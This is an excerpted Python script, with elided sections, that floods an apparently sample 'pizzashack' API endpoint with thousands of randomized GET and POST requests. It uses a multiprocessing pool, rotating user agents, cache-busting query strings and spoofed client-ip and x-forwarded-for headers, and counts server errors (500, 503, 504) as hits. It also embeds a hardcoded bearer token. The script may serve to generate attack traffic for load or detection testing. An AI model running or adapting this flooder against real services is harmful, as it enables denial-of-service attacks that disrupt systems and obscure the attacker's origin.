...
def attacker(num):
    ...
    # header_data = {'User-Agent': random.choice(param_class.headers_useragents), 'Cache-Control': 'no-cache', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
    #               'Referer': random.choice(param_class.headers_referers) + buildblock(random.randint(random.randint(0, 5), random.randint(6, 10))), 'Keep-Alive': str(random.randint(110, 120)),
    #               'Connection': 'keep-alive', 'Host': param_class.host}

    header_data = {
        'User-Agent': random.choice(param_class.headers_useragents),
        'Cache-Control': 'no-cache', 'accept': 'application/json',
        'Authorization': 'Bearer aadd439f-1b17-3f95-88b7-06833cd40892',
        'client-ip': '{}'.format(param_class.ip_addresses[0]),
        'x-forwarded-for': '{}'.format(param_class.ip_addresses[0]),
        'cookie': '{}'.format(param_class.ip_addresses[0])
    }

    req_url_tail = param_joiner + buildblock(random.randint(random.randint(0, 3), random.randint(4, 10))) + '=' + buildblock(random.randint(random.randint(0, 3), random.randint(4, 10)))
    ...
    #urlreq = urlc + "pizzashack/1.0.0{}".format(choice) + req_url_tail

    try:

        if choice == "/menu":

            r = requests.get(url=urlreq, headers=header_data, data=param_class.dt[num], timeout=(15, 30), verify=False)
        else:
            r = requests.post(url=urlreq, headers=header_data, data=param_class.dt[num], timeout=(15, 30), verify=False)
        ...
        if (str(r.status_code) == '500') or (str(r.status_code) == '503') or (str(r.status_code) == '504'):
            ...
            print('Sending crafted request: %s at %s total %d ' % (urlreq, datetime.datetime.now(), counter.value), flush=True)
...
def handler(i):
    ...
    if i < 10000 + fault.value:
        if flag.value < 2:
            ...
            code = attacker(i)
            print("%d Requests Sent at %s " % counter.value, datetime.datetime.now(), flush=True)
            if code == 500:
...
def count_requests(arg):
    print("Current request count {}".format(counter.value))
    print(arg)
...
if __name__ == "__main__":
    ...
    if len(sys.argv) < 2:
        ...
        if sys.argv[1] == "help":
            ...
            p = Pool(processes=number_of_processes, initializer=init, initargs=(counter, status, flag, fault))
            p.map_async(handler, range(iterations + fault.value))
            p.close()
            p.join()
